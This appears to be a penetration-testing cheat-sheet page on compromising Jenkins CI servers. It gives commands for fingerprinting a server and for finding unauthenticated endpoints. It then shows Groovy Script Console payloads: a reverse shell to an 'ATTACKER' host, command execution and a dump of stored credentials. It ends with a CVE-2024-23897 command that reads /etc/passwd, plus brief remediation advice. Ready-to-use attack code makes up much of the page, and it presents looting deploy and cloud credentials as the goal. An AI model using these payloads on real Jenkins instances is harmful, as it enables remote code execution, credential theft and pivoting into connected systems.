---
tags:
  - Web
---

# :material-jenkins: Jenkins

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

Jenkins is a CI server that **runs code by design**. Find the Script Console (or an
unauthenticated instance) and you have RCE as the Jenkins service account — often
with access to build secrets, source, and deploy credentials.

!!! abstract "TL;DR"
    Check for anonymous access → `/script` Groovy console = instant RCE. No console?
    Abuse a build job, `@` build parameters, or crack the version for a known CVE.

## :material-magnify: Identify & access

```bash
curl -sI http://$TARGET/ | grep -i x-jenkins        # version in X-Jenkins header
curl -s http://$TARGET/login | grep -i jenkins
# Is it wide open? try these unauthenticated:
#   /script  /manage  /systemInfo  /asynchPeople/  /view/all/newJob
```

!!! loot "Anonymous 'read' is more common than you'd think"
    Old/default installs allow anonymous access. Even read-only leaks jobs,
    console output (with secrets), and the version for CVE matching.

## :material-fire: RCE — Groovy Script Console

`/script` (or **Manage Jenkins → Script Console**) executes Groovy as the service
user:

```groovy
// Reverse shell from the Script Console
String host="ATTACKER"; int port=443;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
// ...wire streams (use the standard Groovy revshell one-liner)...

// Or just run a command:
println "id".execute().text
```

```groovy
// Dump stored credentials (build secrets, deploy creds, cloud keys)
com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class
).each { println(it.id + " : " + it.username) }
```

!!! loot "Jenkins is a credential piñata"
    Build jobs store SSH keys, cloud API keys, registry tokens, and deploy creds.
    Decrypt them from the console → pivot to [AWS](../cloud/aws.md)/[Cloud](../cloud/index.md) and downstream hosts.

## :material-alert: When the console is locked

- **Build-job abuse** — if you can create/configure a job, add an "Execute shell"
  build step.
- **CVE matching** — e.g. **CVE-2024-23897** (arbitrary file read via the CLI),
  and older RCEs. Match the exact version from the header.
- **Agent-to-controller** — a compromised build agent can sometimes reach the
  controller.

```bash
# CVE-2024-23897 — read arbitrary files via the built-in CLI
java -jar jenkins-cli.jar -s http://$TARGET/ connect-node "@/etc/passwd"
```

## :material-shield-check: Remediation

- Never allow anonymous access; enable matrix/role auth; disable the CLI if unused.
- Lock down the Script Console to admins; rotate stored credentials; patch promptly.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Looted creds → [Cloud](../cloud/index.md), [Credential Hunting](../privesc/credential-hunting.md).
- Reference: [HackTricks Jenkins](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/jenkins.html).
